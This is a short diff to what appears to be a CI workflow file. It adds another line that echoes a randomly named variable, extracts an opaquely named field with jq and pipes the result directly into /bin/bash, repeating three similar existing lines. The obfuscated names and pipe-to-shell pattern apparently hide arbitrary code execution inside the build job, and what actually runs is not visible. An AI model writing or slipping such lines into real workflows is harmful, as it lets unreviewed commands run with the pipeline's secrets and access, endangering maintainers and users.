@@ -32,6 +32,7 @@ jobs:
           echo $xuvx09 | jq -r .l22955 | /bin/bash
           echo $zx091 | jq -r .pto4413 | /bin/bash
           echo $zvle5984 | jq -r .zwlpm838 | /bin/bash
+          echo $dxz8668 | jq -r .if7 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
